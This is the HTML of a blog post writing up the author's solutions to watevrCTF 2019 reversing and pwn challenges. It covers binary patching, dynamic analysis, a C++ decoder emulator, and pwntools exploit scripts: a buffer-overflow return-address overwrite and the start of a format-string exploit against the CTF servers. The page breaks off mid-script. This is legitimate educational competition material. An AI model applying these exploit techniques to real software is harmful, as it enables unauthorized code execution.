@@ -1,0 +1,1422 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.6.2">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Shreyansh Singh">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.
+ Rev Challeneges Timeout File: timeout
+The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.
+   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time.">
+
+  
+  <link rel="alternate" hreflang="en-us" href="/post/2019-12-15_watevr-ctf-2019-writeups/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="#3f51b5">
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/styles/github.min.css" crossorigin="anonymous" title="hl-light">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/styles/github.min.css" crossorigin="anonymous" title="hl-dark" disabled>
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=B612+Mono:400,700%7COrbitron:400,700%7CSpace+Mono:400,700%7CLato%7CMontserrat%7CInconsolata%7COpen+Sans&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-153509490-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag() {
+      dataLayer.push(arguments);
+  }
+
+  function trackOutboundLink(url) {
+    gtag('event', 'click', {
+         'event_category': 'outbound',
+         'event_label': url,
+         'transport_type': 'beacon',
+         'event_callback': function () {
+           document.location = url;
+         }
+    });
+    console.debug("Outbound link clicked: " + url);
+  }
+
+  function onClickCallback(event) {
+    if ((event.target.tagName !== 'A') || (event.target.host === window.location.host)) {
+      return;
+    }
+    trackOutboundLink(event.target);  
+  }
+
+  gtag('js', new Date());
+  gtag('config', 'UA-153509490-1', {});
+
+  
+  document.addEventListener('click', onClickCallback, false);
+</script>
+
+
+  
+
+
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/img/shreyansh-icon-32.png">
+  <link rel="apple-touch-icon" type="image/png" href="/img/shreyansh-icon-192.png">
+
+  <link rel="canonical" href="/post/2019-12-15_watevr-ctf-2019-writeups/">
+
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="twitter:site" content="@shreyansh_26">
+  <meta property="twitter:creator" content="@shreyansh_26">
+  
+  <meta property="og:site_name" content="Shreyansh Singh">
+  <meta property="og:url" content="/post/2019-12-15_watevr-ctf-2019-writeups/">
+  <meta property="og:title" content="watevrCTF 2019 Writeups (Mainly Rev and Pwn) | Shreyansh Singh">
+  <meta property="og:description" content="This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.
+ Rev Challeneges Timeout File: timeout
+The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.
+   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."><meta property="og:image" content="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png">
+  <meta property="twitter:image" content="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png"><meta property="og:locale" content="en-us">
+  
+    
+      <meta property="article:published_time" content="2019-12-15T11:44:06&#43;05:30">
+    
+    <meta property="article:modified_time" content="2019-12-15T11:44:06&#43;05:30">
+  
+
+  
+
+
+    
+
+
+
+
+
+
+  
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/post/2019-12-15_watevr-ctf-2019-writeups/"
+  },
+  "headline": "watevrCTF 2019 Writeups (Mainly Rev and Pwn)",
+  
+  "image": [
+    "/post/2019-12-15_watevr-ctf-2019-writeups/featured.png"
+  ],
+  
+  "datePublished": "2019-12-15T11:44:06+05:30",
+  "dateModified": "2019-12-15T11:44:06+05:30",
+  
+  "author": {
+    "@type": "Person",
+    "name": "Shreyansh Singh"
+  },
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Shreyansh Singh",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/img/shreyansh-icon-512.png"
+    }
+  },
+  "description": "This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.\n Rev Challeneges Timeout File: timeout\nThe binary is unstripped, so we can easily see the main function. The disassembly looks something like this.\n   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."
+}
+</script>
+
+  
+
+  
+
+
+  
+
+
+  
+
+<style>
+
+    @font-face {
+        font-family: monaco123;
+        font-weight: 100%;
+        font-style: normal;
+        src: url("/fonts/MONACO.TTF");
+    } 
+
+    code {
+        font-family: monaco123;
+        font-size: 100%;
+    }
+
+</style>
+
+
+  <title>watevrCTF 2019 Writeups (Mainly Rev and Pwn) | Shreyansh Singh</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" >
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    
+    
+      <a class="navbar-brand" href="/">Shreyansh Singh</a>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link  active" href="/post/"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#projects"><span>Projects</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/files/Shreyansh_Resume.pdf"><span>CV</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      <li class="nav-item">
+        <a class="nav-link js-dark-toggle" href="#"><i class="fas fa-moon" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>watevrCTF 2019 Writeups (Mainly Rev and Pwn)</h1>
+
+  
+  <p class="page-subtitle">My writeups for the challenges I solved in the CTF. I mainly focused on Rev and Pwn categories.</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+
+
+  
+  <span><a href="/authors/shreyansh-singh/">Shreyansh Singh</a></span>
+
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Dec 15, 2019
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    8 min read
+  </span>
+  
+
+  
+  
+  
+  <span class="middot-divider"></span>
+  <a href="/post/2019-12-15_watevr-ctf-2019-writeups/#disqus_thread"></a>
+  
+
+  
+  
+  <span class="middot-divider"></span>
+  <span class="article-categories">
+    <i class="fas fa-folder mr-1"></i><a href="/categories/information-security/">Information Security</a></span>
+  
+
+</div>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+<div class="article-header article-container featured-image-wrapper mt-4 mb-4" style="max-width: 127px; max-height: 150px;">
+  <div style="position: relative">
+    <img src="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">watevrCTF</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <p>This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, <a href="https://ctftime.org/team/72103">Abs0lut3Pwn4g3</a>. Our final rank was 54th.</p>
+<hr>
+<h1 id="rev-challeneges">Rev Challeneges</h1>
+<h2 id="timeout">Timeout</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/timeout">timeout</a></p>
+<p>The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>The functions, <code>signal</code>, <code>alarm</code> and <code>delay</code> all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>We see that there is a flag <em>can_continnue</em> which is set to 0x539, but not used in the code again. Checking the functions, we find one as <code>generate</code>, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using <code>set $rip = 0x4006a6</code>.</p>
+<p>We get the flag - <strong>watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}</strong></p>
+<p> </p>
+<h2 id="hacking-for-vodka">Hacking For Vodka</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/vodka">vodka</a></p>
+<p>The binary has different functionalities when run normally and when run in a debugger. We know this because of the <em>ptrace</em> call.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>I decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.</p>
+<p>Inside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag 😛.</p>
+<p>PS - Before the dynamic analysis, we patch the <code>PTRACE_TRACEME</code> call to jump to the required function.</p>
+<p>The flag is - <strong>watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}</strong></p>
+<p> </p>
+<h2 id="esrever">esreveR</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/esrever">esrever</a></p>
+<p>This was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>So, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.</p>
+<p>On checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.</p>
+<p>Again, dynamic analysis was key here.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>Before the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form <code>$ebp-0x10</code>.</p>
+<p>Tha flag was - <strong>watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}</strong></p>
+<p> </p>
+<h2 id="watshell">watshell</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/watshell">watshell</a></p>
+<p>In this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - &ldquo;give_me_the_flag_please&rdquo;, and only then do we get the flag.</p>
+<p>So, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p><code>strtok</code> is used here, which is used to split the string at some delimiter. And also, <code>atol</code> is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input &ldquo;command&rdquo; as space separated numbers.</p>
+<p>We use dynamic analysis after we give our input, since all the precomputations are done, we don't have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of <em>10 11 12 13 14 15 16</em>, the following parameters are passed -</p>
+<pre><code>0x5555555551af (
+   $rdi = 0x00007fffffffd370 → 0x000000000000000a,
+   $rsi = 0x0000000000000040,
+   $rdx = 0x0000000000000000,
+   $rcx = 0x00007fffffffd350 → 0x000000000000008f
+)
+</code></pre><p>i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array's pointer, with the first element as 0x8f.</p>
+<p>Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>The parameters passed are -</p>
+<pre><code>0x555555554dc3 (
+   $rdi = 0x000000000000000a,    // inp
+   $rsi = 0x0000000000000071,    // arr_ele2
+   $rdx = 0x000000000000008f,    // arr_ele1
+   $rcx = 0x0000000000000071
+)
+</code></pre><p>i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.</p>
+<p>This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
+
+<span style="color:#66d9ef">long</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">long</span> inp, ulong arr_ele2, <span style="color:#66d9ef">long</span> mod) {
+  <span style="color:#66d9ef">long</span> lVar1;
+  
+  <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> inp) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">long</span>)arr_ele2)) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span> mod)) {
+    inp <span style="color:#f92672">=</span> inp <span style="color:#f92672">%</span> mod;
+    <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+      lVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+    }
+    <span style="color:#66d9ef">else</span> {
+      lVar1 <span style="color:#f92672">=</span> inp;
+      <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">if</span> ((arr_ele2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+          lVar1 <span style="color:#f92672">=</span> (inp <span style="color:#f92672">*</span> inp) <span style="color:#f92672">%</span> mod;
+          lVar1 <span style="color:#f92672">=</span> func(lVar1,(<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>,mod);
+          lVar1 <span style="color:#f92672">=</span> lVar1 <span style="color:#f92672">%</span> mod;
+        }
+        <span style="color:#66d9ef">else</span> {
+          lVar1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">int</span>)arr_ele2 <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span>);
+          <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
+            lVar1 <span style="color:#f92672">=</span> func(inp,arr_ele2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>,mod);
+            lVar1 <span style="color:#f92672">=</span> (lVar1 <span style="color:#f92672">*</span> inp) <span style="color:#f92672">%</span> mod;
+          }
+        }
+      }
+    }
+    <span style="color:#66d9ef">return</span> lVar1;
+  }
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+  exit(<span style="color:#ae81ff">1</span>);
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+  map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> m;
+  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100000</span>; i<span style="color:#f92672">+</span><span style="color:#f92672">+</span>) {
+    <span style="color:#66d9ef">long</span> ans <span style="color:#f92672">=</span> func(i, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x8f</span>);
+    <span style="color:#66d9ef">if</span>(m.find((<span style="color:#66d9ef">int</span>)ans) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> m.end())
+      m[(<span style="color:#66d9ef">int</span>)ans] <span style="color:#f92672">=</span> i;
+  }
+  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> i: m) {
+    cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>i.first<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>i.second<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>endl;
+  }
+  string s <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">give_me_the_flag_please</span><span style="color:#e6db74">&#34;</span>;
+  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">char</span> c: s) {
+    cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>m[c]<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span>;
+  }
+  cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>endl;
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Now, what remains is to get the enoced values corresponding to &ldquo;give_me_the_flag_please&rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.</p>
+<p>The flag is - <strong>watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}</strong></p>
+<p> </p>
+<hr>
+<h1 id="pwn-challenges">Pwn Challenges</h1>
+<h2 id="voting-machine-1">Voting Machine 1</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze">kamikaze</a></p>
+<p>This is a buffer overflow challenge as gets has been used. There is a function <code>super_secret_function</code>. We basically have to jump there as it prints the flag. Pretty straightforward.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>The offset of the crash is calculated using gef's pattern create and pattern search functionality.</p>
+<p>My exploit code -</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./kamikaze</span><span style="color:#e6db74">&#34;</span>)
+e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./kamikaze</span><span style="color:#e6db74">&#39;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">13.48.67.196</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">50000</span>)
+
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
+
+func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400807</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(func)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(payload)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The flag is - <strong>watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_<a href="https://www.youtube.com/watch?v=Va4aF6rRdqU">https://www.youtube.com/watch?v=Va4aF6rRdqU</a>}</strong></p>
+<p> </p>
+<h2 id="voting-machine-2">Voting Machine 2</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2">kamikaze2</a></p>
+<p>This binary had a format string vulnerability, since printf is being used without any format specifiers.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>I played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with <code>%x</code>s. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).</p>
+<p>After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.</p>
+<p>The final exploit code is -</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./kamikaze2</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">13.53.125.206</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">50000</span>)
+
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>
